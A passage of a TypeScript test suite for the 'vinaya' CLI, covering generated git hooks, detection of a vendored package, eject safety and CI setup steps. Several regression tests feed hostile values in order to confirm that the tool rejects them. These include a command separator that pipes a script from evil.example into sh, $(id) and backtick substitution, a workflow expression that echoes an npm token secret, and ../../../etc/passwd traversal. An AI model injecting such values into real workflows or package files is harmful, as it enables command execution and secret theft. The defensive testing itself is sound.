    const prePush = readFileSync(join(root, '.husky/pre-push'), 'utf-8')
    expect(prePush).not.toContain('bunx turbo')
    expect(prePush).not.toContain('bunx biome')
    expect(prePush).not.toContain('pre-push-select-tests')
    expect(prePush).not.toContain('pre-push-changed-files')
  })

  it('refuses the push (non-zero exit) when typecheck fails — real end-to-end execution', async () => {
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))

    // Stand in for the built CLI (`node <bin> check --all --local`) so the
    // check half of the hook passes cleanly and execution reaches the
    // steps this test is actually about. No real git repo exists in this
    // fixture, so the changed-files/selector scripts' own `git` calls
    // fail closed to "nothing changed" (empty output, never a thrown
    // error) — the Biome step is skipped as a result, and execution
    // reaches the fake `bunx` below at the typecheck line.
    mkdirSync(join(root, 'apps/cli/dist'), { recursive: true })
    writeFileSync(join(root, 'apps/cli/dist/index.js'), 'process.exit(0)\n')

    // A fake `bunx` on PATH that fails, exactly as a real red typecheck
    // would — this is the mechanism under test, not the real turbo binary.
    const fakeBinDir = join(root, 'fake-bin')
    mkdirSync(fakeBinDir, { recursive: true })
    writeFileSync(join(fakeBinDir, 'bunx'), '#!/bin/sh\necho "fake turbo: typecheck failed" >&2\nexit 1\n', {
      mode: 0o755
    })

    let error: unknown
    try {
      execFileSync('sh', [join(root, '.husky/pre-push')], {
        cwd: root,
        input: 'refs/heads/main abc123 refs/heads/main def456\n',
        stdio: ['pipe', 'pipe', 'pipe'],
        env: { ...process.env, PATH: `${fakeBinDir}:${process.env.PATH}` }
      })
    } catch (e) {
      error = e
    }
    expect(error).toBeDefined()
    const stderr = String((error as { stderr?: Buffer })?.stderr ?? '')
    expect(stderr).toContain('fake turbo: typecheck failed')
  })
})

describe('generated pre-commit hook: scoped format/lint/typecheck (O9)', () => {
  function vendorVinaya(): void {
    writeFileSync(
      join(root, 'package.json'),
      `${JSON.stringify({ name: 'vinaya', private: true, workspaces: ['apps/*', 'packages/*'] }, null, 2)}\n`
    )
    mkdirSync(join(root, 'apps/cli'), { recursive: true })
    writeFileSync(
      join(root, 'apps/cli/package.json'),
      `${JSON.stringify({ name: '@attalabs/vinaya', version: '0.4.6', bin: { vinaya: './dist/index.js' } }, null, 2)}\n`
    )
  }

  it('fixes staged files with biome, restages them, then type-checks only affected packages — vendored repo only', async () => {
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const preCommit = readFileSync(join(root, '.husky/pre-commit'), 'utf-8')
    expect(preCommit).toContain('bunx biome check --write --staged . --no-errors-on-unmatched')
    expect(preCommit).toContain('bunx turbo typecheck --affected')
    // The fix-then-restage step must run BEFORE typecheck (so typecheck sees
    // the fixed code) and typecheck must run BEFORE the doctrine gate (cheap,
    // deterministic checks refuse first).
    expect(preCommit.indexOf('bunx biome check --write --staged . --no-errors-on-unmatched')).toBeLessThan(
      preCommit.indexOf('bunx turbo typecheck --affected')
    )
    expect(preCommit.indexOf('bunx turbo typecheck --affected')).toBeLessThan(
      preCommit.indexOf('check --all --diff-only')
    )
  })

  it('restages exactly the files that were staged before the fix, not the whole working tree', async () => {
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const preCommit = readFileSync(join(root, '.husky/pre-commit'), 'utf-8')
    expect(preCommit).toContain('git diff --cached --name-only --diff-filter=ACMR')
    expect(preCommit).toContain('xargs git add --')
  })

  it('an ordinary (non-vendored) adopter never gets the biome/turbo steps — no assumption they run Bun/Biome/Turborepo', async () => {
    await captureStdout(() => runInit(['--yes'], makeDeps()))
    const preCommit = readFileSync(join(root, '.husky/pre-commit'), 'utf-8')
    expect(preCommit).not.toContain('bunx biome')
    expect(preCommit).not.toContain('bunx turbo')
  })

  it('refuses the commit (non-zero exit) when biome finds an unfixable violation — real end-to-end execution', async () => {
    vendorVinaya()
    await captureStdout(() => runInit(['--yes'], makeDeps()))

    mkdirSync(join(root, 'apps/cli/dist'), { recursive: true })
    writeFileSync(join(root, 'apps/cli/dist/index.js'), 'process.exit(0)\n')

    // A fake `bunx` on PATH that fails on the biome step, exactly as a real
    // unfixable violation would — this is the mechanism under test, not the
    // real biome binary.
    const fakeBinDir = join(root, 'fake-bin')
    mkdirSync(fakeBinDir, { recursive: true })
    writeFileSync(
      join(fakeBinDir, 'bunx'),
      '#!/bin/sh\nif [ "$1" = "biome" ]; then echo "fake biome: unfixable violation" >&2; exit 1; fi\nexit 0\n',
      { mode: 0o755 }
    )

    let error: unknown
    try {
      execFileSync('sh', [join(root, '.husky/pre-commit')], {
        cwd: root,
        stdio: ['pipe', 'pipe', 'pipe'],
        env: { ...process.env, PATH: `${fakeBinDir}:${process.env.PATH}` }
      })
    } catch (e) {
      error = e
    }
    expect(error).toBeDefined()
    const stderr = String((error as { stderr?: Buffer })?.stderr ?? '')
    expect(stderr).toContain('fake biome: unfixable violation')
  })
})

describe('detectVendoredVinaya', () => {
  it('is null for a repo with no package.json, no workspaces, or no such member', () => {
    expect(detectVendoredVinaya(root)).toBeNull() // bare fixture: README.md only

    writeFileSync(join(root, 'package.json'), '{ "name": "widget" }\n')
    expect(detectVendoredVinaya(root)).toBeNull() // no workspaces field

    writeFileSync(join(root, 'package.json'), '{ "name": "widget", "workspaces": ["apps/*"] }\n')
    mkdirSync(join(root, 'apps/web'), { recursive: true })
    writeFileSync(join(root, 'apps/web/package.json'), '{ "name": "@widget/web" }\n')
    expect(detectVendoredVinaya(root)).toBeNull() // a workspace, but not ours
  })

  it('never throws on a malformed root package.json — an adopter install must not die on it', () => {
    writeFileSync(join(root, 'package.json'), '{ not json at all\n')
    expect(detectVendoredVinaya(root)).toBeNull()
  })

  it('finds the member through a glob and honours its declared bin', () => {
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/*"] }\n')
    mkdirSync(join(root, 'apps/cli'), { recursive: true })
    writeFileSync(
      join(root, 'apps/cli/package.json'),
      '{ "name": "@attalabs/vinaya", "bin": { "vinaya": "./dist/index.js" } }\n'
    )
    expect(detectVendoredVinaya(root)).toEqual({ dir: 'apps/cli', bin: 'apps/cli/dist/index.js' })
  })

  it('accepts the { packages: [...] } workspaces form and a non-default bin path', () => {
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": { "packages": ["tools/vinaya"] } }\n')
    mkdirSync(join(root, 'tools/vinaya'), { recursive: true })
    writeFileSync(join(root, 'tools/vinaya/package.json'), '{ "name": "@attalabs/vinaya", "bin": "build/cli.js" }\n')
    expect(detectVendoredVinaya(root)).toEqual({ dir: 'tools/vinaya', bin: 'tools/vinaya/build/cli.js' })
  })

  // Both fields land in a workflow `run:` as bare shell words, and both come
  // from the target repo. Each payload below was reproduced end-to-end against
  // the unguarded version — these are regressions, not hypotheticals.
  const UNSAFE_BINS: Array<[string, string]> = [
    ['a command separator', 'dist/i.js; curl https://evil.example/s.sh | sh'],
    ['command substitution', 'dist/$(id).js'],
    ['backtick substitution', 'dist/`id`.js'],
    ['a newline, which injects an entire extra step', 'dist/i.js\n      - run: id'],
    // biome-ignore lint/suspicious/noTemplateCurlyInString: GitHub Actions expression syntax, deliberately a plain string — it is the payload
    ['an Actions expression, which reaches secrets', 'dist/i.js; echo ${{ secrets.NPM_TOKEN }}'],
    ['a pipe', 'dist/i.js | tee /tmp/x'],
    ['traversal out of the member', '../../../etc/passwd']
  ]

  for (const [label, bin] of UNSAFE_BINS) {
    it(`refuses a bin containing ${label} — falls back to the adopter shape`, () => {
      writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/*"] }\n')
      mkdirSync(join(root, 'apps/cli'), { recursive: true })
      writeFileSync(
        join(root, 'apps/cli/package.json'),
        JSON.stringify({ name: '@attalabs/vinaya', bin: { vinaya: bin } })
      )
      expect(detectVendoredVinaya(root)).toBeNull()
    })
  }

  it('refuses an unsafe member directory even with no bin declared', () => {
    // `$(id)` is a legal directory name and `apps/*` matches it, so the
    // package.json need not be hostile at all.
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/*"] }\n')
    mkdirSync(join(root, 'apps/$(id)'), { recursive: true })
    writeFileSync(join(root, 'apps/$(id)/package.json'), '{ "name": "@attalabs/vinaya" }\n')
    expect(detectVendoredVinaya(root)).toBeNull()
  })

  it('refuses a member reached by a traversing workspace pattern', () => {
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["../outside/*"] }\n')
    mkdirSync(join(root, '../outside/pkg'), { recursive: true })
    writeFileSync(join(root, '../outside/pkg/package.json'), '{ "name": "@attalabs/vinaya" }\n')
    try {
      expect(detectVendoredVinaya(root)).toBeNull()
    } finally {
      rmSync(join(root, '../outside'), { recursive: true, force: true })
    }
  })

  it('refuses a member directory whose name starts with a dash', () => {
    // `-e` / `--eval` reach `node` in argument position. Node ACCEPTS a
    // detached value (`node -e 'code'` runs it) and rejects the attached
    // form, which is the only form the emitted single-token path can take —
    // see self-host.ts. So this breaks CI rather than executing, and the
    // property keeping it that way is not enforced anywhere else.
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/*"] }\n')
    mkdirSync(join(root, 'apps/-e'), { recursive: true })
    writeFileSync(join(root, 'apps/-e/package.json'), '{ "name": "@attalabs/vinaya" }\n')
    expect(detectVendoredVinaya(root)).toBeNull()
  })

  it('accepts a scoped member directory — the shape this feature exists for', () => {
    // `@` is an ordinary directory character and means nothing to the shell.
    // Refusing it would degrade a scoped member into the broken `npx` shape.
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["packages/*/*"] }\n')
    mkdirSync(join(root, 'packages/@attalabs/vinaya'), { recursive: true })
    writeFileSync(join(root, 'packages/@attalabs/vinaya/package.json'), '{ "name": "@attalabs/vinaya" }\n')
    expect(detectVendoredVinaya(root)).toEqual({
      dir: 'packages/@attalabs/vinaya',
      bin: 'packages/@attalabs/vinaya/dist/index.js'
    })
  })

  it('collapses runs of stars before the bound counts them', () => {
    // Behavioural, not timed. A wall-clock assertion cannot see this: with
    // collapsing removed the worst shape costs ~248ms, under any threshold
    // loose enough to survive a loaded runner. Two earlier forms of this test
    // passed with the mechanism disabled for exactly that reason.
    //
    // Collapsing is a widening, and that is what makes it observable. Eight
    // ADJACENT stars exceed MAX_SEGMENT_STARS as typed and are refused; they
    // collapse to one star, which is the same glob, and resolve. Non-adjacent
    // stars survive collapsing and are still counted, so the bound is not
    // weakened — the second half asserts that.
    mkdirSync(join(root, 'apps/cli'), { recursive: true })
    writeFileSync(join(root, 'apps/cli/package.json'), '{ "name": "@attalabs/vinaya" }\n')

    // 8 adjacent stars -> collapses to `c*i` -> matches
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/c********i"] }\n')
    expect(detectVendoredVinaya(root)).toEqual({ dir: 'apps/cli', bin: 'apps/cli/dist/index.js' })

    // 8 separated stars -> collapsing changes nothing -> still over the bound.
    // The pattern MUST be one that would otherwise match: `c*l*i*x*y*z*w*v*q`
    // matches no directory either way, so it could not observe the bound.
    mkdirSync(join(root, 'apps/clixyzwvq'), { recursive: true })
    writeFileSync(join(root, 'apps/clixyzwvq/package.json'), '{ "name": "@attalabs/vinaya" }\n')
    rmSync(join(root, 'apps/cli'), { recursive: true, force: true })
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/c*l*i*x*y*z*w*v*q"] }\n')
    expect(detectVendoredVinaya(root)).toBeNull()
  })

  it('refuses a segment with more stars than the bound allows', () => {
    // Deliberately behavioural rather than timed. A wall-clock assertion here
    // passed with the bound disabled — 8 stars against a 37-char name is only
    // ~69ms unguarded, well under any threshold loose enough to survive a
    // loaded runner. This pair discriminates on the bound itself: same
    // directory, same match, one star either side of MAX_SEGMENT_STARS.
    const vendor = () => {
      mkdirSync(join(root, 'apps/aaaaab'), { recursive: true })
      writeFileSync(join(root, 'apps/aaaaab/package.json'), '{ "name": "@attalabs/vinaya" }\n')
    }

    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/a*a*a*a*a*b"] }\n') // 5
    vendor()
    expect(detectVendoredVinaya(root)).toBeNull()

    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/a*a*a*a*b"] }\n') // 4
    expect(detectVendoredVinaya(root)).toEqual({ dir: 'apps/aaaaab', bin: 'apps/aaaaab/dist/index.js' })
  })

  it('refuses a literal workspace segment that symlinks outside the repo', () => {
    // The `..` rule is textual and cannot see this: `vendored` is a clean
    // relative path. The wildcard route is already safe (Dirent.isDirectory()
    // is false for a symlink); this is the literal route.
    const outside = join(root, '..', `outside-${Date.now()}`)
    mkdirSync(outside, { recursive: true })
    writeFileSync(join(outside, 'package.json'), '{ "name": "@attalabs/vinaya" }\n')
    try {
      symlinkSync(outside, join(root, 'vendored'))
      writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["vendored"] }\n')
      expect(detectVendoredVinaya(root)).toBeNull()
    } finally {
      rmSync(outside, { recursive: true, force: true })
    }
  })

  it('still accepts the ordinary paths the guard must not break', () => {
    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["packages/*"] }\n')
    mkdirSync(join(root, 'packages/vinaya-cli.v2'), { recursive: true })
    writeFileSync(
      join(root, 'packages/vinaya-cli.v2/package.json'),
      '{ "name": "@attalabs/vinaya", "bin": "./dist/index.js" }\n'
    )
    expect(detectVendoredVinaya(root)).toEqual({
      dir: 'packages/vinaya-cli.v2',
      bin: 'packages/vinaya-cli.v2/dist/index.js'
    })
  })
})

// atta-labs/attalabs#935. #929 fixed the four generated WORKFLOWS and left the two
// hook emitters on the published `npx @attalabs/vinaya@<version>` spec — which
// in a vendoring repo resolves to that repo's own unbuilt member and blocks
// every commit and push with `sh: vinaya: command not found`. Both shapes are
// asserted here for the same reason the workflow block asserts both: a test
// that only pinned the published string was pinning the defect.
describe('generated git hooks: published vs vendored invocation (atta-labs/attalabs#935)', () => {
  const VENDORED: VendoredVinaya = { dir: 'apps/cli', bin: 'apps/cli/dist/index.js' }

  function hookBodies(selfHost: VendoredVinaya | null): string[] {
    return buildInitOps({
      owner: 'acme',
      repo: 'widget',
      hookDir: '.husky',
      selfHost,
      ciSetup: null,
      agents: new Set<AgentVendor>()
    })
      .filter((op) => op.kind === 'managed-block' && /pre-(commit|push)/.test(op.path))
      .map((op) => (op.kind === 'managed-block' ? op.body : ''))
  }

  it('vendored repo: both hooks run the built bin, never npx', () => {
    const bodies = hookBodies(VENDORED)
    expect(bodies.length).toBe(2)
    for (const body of bodies) {
      expect(body).toContain(`node ${VENDORED.bin} check`)
      // The generated comment names `npx` to explain why it isn't used; what
      // must be absent is an npx INVOCATION.
      expect(body).not.toContain('npx --yes')
      expect(body).toContain('--local')
    }
    // The two hooks keep their distinct scopes: staged diff vs whole branch.
    expect(bodies.filter((b) => b.includes('--diff-only')).length).toBe(1)
  })

  it('vendored repo: a missing build fails the hook loudly — never a silent skip', () => {
    // `dist/` is generated and git-ignored, so it is legitimately absent in a
    // fresh clone and in every new worktree. Skipping the checks there would
    // turn a loud breakage into an absent ring 0, with nothing saying so.
    for (const body of hookBodies(VENDORED)) {
      expect(body).toContain(`if [ ! -f ${VENDORED.bin} ]`)
      expect(body).toContain(`bun run --cwd ${VENDORED.dir} build`)
      expect(body).toContain('exit 1')
    }
  })

  it('ordinary adopter: byte-for-byte the published shape, with no build guard', () => {
    // The constraint #929 established for workflows, applied here: an adopter
    // with no local copy must not pay for a problem they do not have.
    for (const body of hookBodies(null)) {
      expect(body).toContain('npx --yes @attalabs/vinaya@')
      expect(body).not.toContain('node ')
      expect(body).not.toContain('if [ ! -f')
    }
  })
})

describe('generated commit-msg hook (Issue #63)', () => {
  const VENDORED: VendoredVinaya = { dir: 'apps/cli', bin: 'apps/cli/dist/index.js' }

  function commitMsgBody(selfHost: VendoredVinaya | null): string {
    const op = buildInitOps({
      owner: 'acme',
      repo: 'widget',
      hookDir: '.husky',
      selfHost,
      ciSetup: null,
      agents: new Set<AgentVendor>()
    }).find((o) => o.kind === 'managed-block' && o.marker === 'commit-msg')
    if (op?.kind !== 'managed-block') throw new Error('commit-msg op not found')
    return op.body
  }

  it('is registered as its own managed block, distinct from pre-commit/pre-push', () => {
    const ops = buildInitOps({
      owner: 'acme',
      repo: 'widget',
      hookDir: '.husky',
      selfHost: null,
      ciSetup: null,
      agents: new Set<AgentVendor>()
    })
    const hookOps = ops.filter((o) => o.kind === 'managed-block' && o.path.includes('.husky/'))
    expect(hookOps.map((o) => (o.kind === 'managed-block' ? o.marker : ''))).toEqual([
      'pre-commit',
      'pre-push',
      'commit-msg'
    ])
  })

  it('vendored repo: runs the built bin, never npx, passing $1 and $2 through', () => {
    const body = commitMsgBody(VENDORED)
    expect(body).toContain(`node ${VENDORED.bin} commit-msg "$1" "$2"`)
    expect(body).not.toContain('npx --yes')
    expect(body).toContain(`if [ ! -f ${VENDORED.bin} ]`)
    expect(body).toContain(`bun run --cwd ${VENDORED.dir} build`)
  })

  it('ordinary adopter: byte-for-byte the published shape, with no build guard', () => {
    const body = commitMsgBody(null)
    expect(body).toContain('npx --yes @attalabs/vinaya@')
    expect(body).toContain('commit-msg "$1" "$2"')
    expect(body).not.toContain('node ')
    expect(body).not.toContain('if [ ! -f')
  })

  it('does not pass --local — a commit-msg hook has no diff and no requiresOpenPr check to skip', () => {
    for (const body of [commitMsgBody(null), commitMsgBody(VENDORED)]) {
      expect(body).not.toContain('--local')
      expect(body).not.toContain('check ')
    }
  })
})

describe('round-trip: init then eject returns the repo to pre-init state', () => {
  it('clean fixture: filesystem is identical before init and after eject', async () => {
    const before = snapshot(root)
    await runInit(['--yes'], makeDeps())
    expect(snapshot(root)).not.toEqual(before) // init changed things
    const out = await captureStdout(() => runEject(['--yes'], ejectDeps()))
    expect(snapshot(root)).toEqual(before) // eject restored exactly
    // labels reported for manual removal, never auto-deleted
    expect(out).toContain('gh label delete vinaya/tier:0')
  })

  it('scaffold-folder placeholders (task 8): init creates both, eject removes both exactly', async () => {
    await runInit(['--yes'], makeDeps())
    expect(existsSync(join(root, CHECKS_FOLDER_PLACEHOLDER_PATH))).toBe(true)
    expect(existsSync(join(root, ROLES_FOLDER_PLACEHOLDER_PATH))).toBe(true)

    await runEject(['--yes'], ejectDeps())
    expect(existsSync(join(root, CHECKS_FOLDER_PLACEHOLDER_PATH))).toBe(false)
    expect(existsSync(join(root, ROLES_FOLDER_PLACEHOLDER_PATH))).toBe(false)
  })

  it('fixture with adopter lines in a hook: eject strips only the vinaya block', async () => {
    mkdirSync(join(root, '.husky'), { recursive: true })
    writeFileSync(join(root, '.husky/pre-commit'), '#!/usr/bin/env sh\nnpm run lint\n')
    const before = snapshot(root)

    await runInit(['--yes'], makeDeps())
    await runEject(['--yes'], ejectDeps())

    // their hook + line survive; no vinaya block remains
    const hook = readFileSync(join(root, '.husky/pre-commit'), 'utf-8')
    expect(hook).toContain('npm run lint')
    expect(hook).not.toContain('vinaya:managed')
    // everything else restored
    expect(snapshot(root)).toEqual(before)
  })

  it('eject is a no-op on an untouched repo', async () => {
    const before = snapshot(root)
    const rc = await runEject(['--yes'], ejectDeps())
    expect(rc).toBe(0)
    expect(snapshot(root)).toEqual(before)
  })

  it('eject refuses when the manifest is missing/corrupt (never a destructive guess)', async () => {
    // vinaya.config.json present but no `managed` manifest
    writeFileSync(
      join(root, CONFIG_PATH),
      JSON.stringify({ rings: { ring1_forgeWriteInterception: false, ring2_asyncAudits: false } })
    )
    const rc = await runEject(['--yes'], ejectDeps())
    expect(rc).toBe(1)
    // did not delete the file it could not prove ownership of
    expect(existsSync(join(root, CONFIG_PATH))).toBe(true)
  })
})

describe('vinaya init product', () => {
  it('refuses before init, then writes a .vinaya/projects.md row and nothing else', async () => {
    // before init
    const rcBefore = await runInitProduct(['mobile'], makeDeps())
    expect(rcBefore).toBe(1)

    await runInit(['--yes'], makeDeps())
    const treeAfterInit = snapshot(root)
    const labelsAfterInit = [...createdLabels]
    createdLabels = [] // isolate what `init product` creates

    const rc = await runInitProduct(['mobile', '--path', 'apps/mobile', '--yes'], makeDeps())
    expect(rc).toBe(0)
    // No forge op at all (#72). The `project:<name>` label is gone: project is
    // a field, not a label, so it created something no shipped consumer read.
    expect(createdLabels).toEqual([])
    expect(existsSync(join(root, 'governance'))).toBe(false)
    // the registry row IS a new local file, so the tree grows by exactly
    // `.vinaya/projects.md` — it is deliberately not tracked in the managed
    // manifest (adopter-declared data, not vinaya-owned scaffolding).
    const treeAfterProduct = snapshot(root)
    const newPaths = [...treeAfterProduct.keys()].filter((p) => !treeAfterInit.has(p))
    expect(newPaths).toEqual(['.vinaya/projects.md'])
    const registry = readFileSync(join(root, '.vinaya/projects.md'), 'utf-8')
    expect(registry).toContain('| mobile | `apps/mobile` | `apps/mobile/specs/` |')
    const cfg = JSON.parse(readFileSync(join(root, CONFIG_PATH), 'utf-8'))
    // `init`'s own labels survive untouched; `init product` adds none.
    expect(cfg.managed.labels).toEqual(labelsAfterInit)
    expect(cfg.managed.labels).not.toContain('project:mobile')
    expect(cfg.managed.files).not.toContain('.vinaya/projects.md')
  })

  it('works with no GitHub remote at all — the registry row is a pure local write', async () => {
    await runInit(['--yes'], makeDeps())
    createdLabels = []

    // Previously this warned and skipped the label; with no forge op left
    // there is nothing to skip, and the command simply succeeds.
    const rc = await runInitProduct(
      ['mobile', '--path', 'apps/mobile', '--yes'],
      makeDeps({ detectRepo: async () => ({ repoRoot: root, owner: '', repo: '' }) })
    )
    expect(rc).toBe(0)
    expect(createdLabels).toEqual([])
    expect(readFileSync(join(root, '.vinaya/projects.md'), 'utf-8')).toContain('| mobile |')
  })

  it('re-running init product for the same name is idempotent (no duplicate row)', async () => {
    await runInit(['--yes'], makeDeps())
    await runInitProduct(['mobile', '--path', 'apps/mobile', '--yes'], makeDeps())
    const rc = await runInitProduct(['mobile', '--path', 'apps/mobile', '--yes'], makeDeps())
    expect(rc).toBe(0)
    const registry = readFileSync(join(root, '.vinaya/projects.md'), 'utf-8')
    const rows = registry.split('\n').filter((l) => l.trim().startsWith('| mobile |'))
    expect(rows).toHaveLength(1)
  })

  it('appends a second row for a second product without disturbing the first', async () => {
    await runInit(['--yes'], makeDeps())
    await runInitProduct(['mobile', '--path', 'apps/mobile', '--yes'], makeDeps())
    await runInitProduct(['web', '--path', 'apps/web', '--yes'], makeDeps())
    const registry = readFileSync(join(root, '.vinaya/projects.md'), 'utf-8')
    expect(registry).toContain('| mobile | `apps/mobile` |')
    expect(registry).toContain('| web | `apps/web` |')
  })

  it('rejects a product name with path traversal, creating nothing (security finding 2)', async () => {
    await runInit(['--yes'], makeDeps())
    const before = snapshot(root)
    createdLabels = []
    for (const bad of ['../../evil', 'a/b', '..', 'Mobile', 'has space']) {
      const rc = await runInitProduct([bad, '--yes'], makeDeps())
      expect(rc).toBe(2)
    }
    expect(snapshot(root)).toEqual(before)
    expect(createdLabels).toEqual([]) // no label leaked for a bad name
  })

  it('rejects a --path containing a pipe or newline, writing nothing to the registry (review finding 1)', async () => {
    await runInit(['--yes'], makeDeps())
    const before = snapshot(root)
    createdLabels = []
    for (const bad of ['apps/evil | injected | row', 'apps/evil\nrow']) {
      const rc = await runInitProduct(['mobile', '--path', bad, '--yes'], makeDeps())
      expect(rc).toBe(2)
    }
    expect(snapshot(root)).toEqual(before)
    expect(createdLabels).toEqual([])
  })

  it('rejects a --path containing a backtick, naming it in the refusal, writing nothing (Issue #181)', async () => {
    await runInit(['--yes'], makeDeps())
    const before = snapshot(root)
    createdLabels = []
    const errors: string[] = []
    const origError = console.error
    console.error = (msg: string) => errors.push(msg)
    try {
      const rc = await runInitProduct(['mobile', '--path', 'apps/we`b', '--yes'], makeDeps())
      expect(rc).toBe(2)
    } finally {
      console.error = origError
    }
    expect(errors.join('\n')).toContain('backtick')
    expect(snapshot(root)).toEqual(before)
    expect(createdLabels).toEqual([])
  })

  it('round-trips an accepted --path verbatim through the registry parser (Issue #181)', async () => {
    await runInit(['--yes'], makeDeps())
    createdLabels = []
    const rc = await runInitProduct(['mobile', '--path', 'apps/mobile', '--yes'], makeDeps())
    expect(rc).toBe(0)
    const registry = readFileSync(join(root, '.vinaya/projects.md'), 'utf-8')
    const [project] = parseRegistry(registry)
    expect(project?.name).toBe('mobile')
    expect(project?.path).toBe('apps/mobile')
    expect(project?.specsPath).toBe('apps/mobile/specs/')
  })
})

describe('eject path-traversal safety (security finding 1)', () => {
  it('refuses a hostile manifest (`..` path) and deletes nothing outside the repo', async () => {
    // OUTSIDE.txt lives one dir above the repo root; a hostile manifest tries to reach it.
    const parent = join(tmpdir(), `vinaya-esc-${Date.now()}-${Math.random().toString(36).slice(2)}`)
    mkdirSync(join(parent, 'repo'), { recursive: true })
    const localRoot = join(parent, 'repo')
    const outside = join(parent, 'OUTSIDE.txt')
    writeFileSync(outside, 'must survive')
    // A `..` path fails the schema refinement → readManifest sees it as corrupt → orphan refuse.
    writeFileSync(
      join(localRoot, 'vinaya.config.json'),
      JSON.stringify({ managed: { version: 1, files: ['../OUTSIDE.txt'], blocks: [], labels: [] } })
    )
    const rc = await runEject(['--yes'], {
      detectRepo: async () => ({ repoRoot: localRoot, owner: 'acme', repo: 'widget' }),
      readHooksPath: async () => null,
      unsetHooksPath: async () => {},
      confirm: async () => true
    })
    expect(rc).toBe(1)
    expect(existsSync(outside)).toBe(true) // never deleted
    rmSync(parent, { recursive: true, force: true })
  })
})

describe('partial-failure ownership recording (review finding 3)', () => {
  it('persists the files+blocks manifest before labels, so a label-create failure cannot orphan files', async () => {
    const throwing: LabelGateway = {
      async exists() {
        return false
      },
      async create() {
        throw new Error('gh rate limit')
      }
    }
    let rc = -1
    await captureStdout(async () => {
      rc = await runInit(['--yes'], makeDeps({ labelGateway: () => throwing }))
    })
    // A label-create failure is a warning, not a crash — every other artifact
    // already applied, so the command still finishes with exit 0.
    expect(rc).toBe(0)
    // files were written AND recorded despite the label failure
    expect(existsSync(join(root, CHECKS_WORKFLOW_PATH))).toBe(true)
    const cfg = JSON.parse(readFileSync(join(root, CONFIG_PATH), 'utf-8'))
    expect(cfg.managed.files).toContain(CHECKS_WORKFLOW_PATH)
    // → eject can now clean up (no orphan half-state)
    const before = snapshot(root)
    await runEject(['--yes'], ejectDeps())
    expect(snapshot(root)).not.toEqual(before)
    expect(existsSync(join(root, CHECKS_WORKFLOW_PATH))).toBe(false)
  })

  it('warns with the specific label name and the gateway failure reason, and continues to the next label', async () => {
    const flaky: LabelGateway = {
      async exists() {
        return false
      },
      async create(name) {
        if (name.endsWith('tier:0')) throw new Error('HTTP 404: Not Found')
        createdLabels.push(name)
      }
    }
    const originalWarn = console.warn
    const warnings: string[] = []
    console.warn = ((...args: unknown[]) => {
      warnings.push(args.join(' '))
    }) as typeof console.warn
    let rc = -1
    try {
      await captureStdout(async () => {
        rc = await runInit(['--yes'], makeDeps({ labelGateway: () => flaky }))
      })
    } finally {
      console.warn = originalWarn
    }
    expect(rc).toBe(0)
    expect(warnings.some((w) => w.includes('tier:0') && w.includes('HTTP 404: Not Found'))).toBe(true)
    // every other label still gets created — one failure doesn't stop the loop
    expect(createdLabels.length).toBeGreaterThan(0)
  })
})

describe('adopter-declared CI setup (ci.setup)', () => {
  const base = {
    owner: 'acme',
    repo: 'widget',
    hookDir: '.husky' as const,
    selfHost: null,
    agents: new Set<AgentVendor>()
  }
  const CUSTOM_CHECK_EXECUTING = [CHECKS_WORKFLOW_PATH]

  function workflowContent(ciSetup: string | null, path: string): string {
    const op = buildInitOps({ ...base, ciSetup }).find((o) => o.kind === 'create-file' && o.path === path)
    if (op?.kind !== 'create-file') throw new Error(`no create-file op for ${path}`)
    return op.content
  }

  it('emits the step only where adopter-authored custom checks execute', () => {
    for (const path of CUSTOM_CHECK_EXECUTING) {
      const content = workflowContent('npm ci', path)
      expect(content).toContain('- name: Adopter CI setup')
      expect(content).toContain('          npm ci')
      // preparation must precede execution — the step exists so the check
      // runner finds the adopter's code already installed
      expect(content.indexOf('Adopter CI setup')).toBeLessThan(content.indexOf(PUBLISHED_RUN))
    }
    expect(workflowContent('npm ci', REVIEW_WORKFLOW_PATH)).not.toContain('Adopter CI setup')
    expect(workflowContent('npm ci', REVIEW_VERDICT_WORKFLOW_PATH)).not.toContain('Adopter CI setup')
  })

  it('never emits the step in the archivist workflow — archive/audit spawn no adopter checks', () => {
    expect(workflowContent('npm ci', ARCHIVIST_WORKFLOW_PATH)).not.toContain('Adopter CI setup')
  })

  it('emits nothing when undeclared — no trace of the feature in any workflow', () => {
    for (const path of [
      ...CUSTOM_CHECK_EXECUTING,
      REVIEW_WORKFLOW_PATH,
      REVIEW_RETRIGGER_WORKFLOW_PATH,
      REVIEW_VERDICT_WORKFLOW_PATH,
      ARCHIVIST_WORKFLOW_PATH
    ]) {
      const content = workflowContent(null, path)
      expect(content).not.toContain('Adopter CI setup')
      expect(content).not.toContain('ci.setup')
    }
  })

  it('a first line carrying extra leading whitespace cannot break the block scalar (reviewer finding)', () => {
    // YAML derives a `|` scalar's indentation from its first non-empty
    // line; without normalization, `"  a\nb"` would set it to 12 and the
    // 10-column `b` line would de-dent out of the scalar, producing an
    // invalid workflow. trimStart() pins the reference to column 10.
    const content = workflowContent('  npm ci\necho done', CHECKS_WORKFLOW_PATH)
    expect(content).toContain('          npm ci\n          echo done')
    expect(content).not.toContain('            npm ci')
  })

  it('multi-command values chained with && land verbatim on one run line', () => {
    const cmd = 'npm install -g bun && bun install --frozen-lockfile --ignore-scripts'
    const content = workflowContent(cmd, CHECKS_WORKFLOW_PATH)
    expect(content).toContain(`          ${cmd}`)
  })

  it('runInit reads ci.setup from a pre-existing repo-root config and writes it into the generated workflow', async () => {
    // The non-greenfield adopter path: the config exists (foreign, refused as
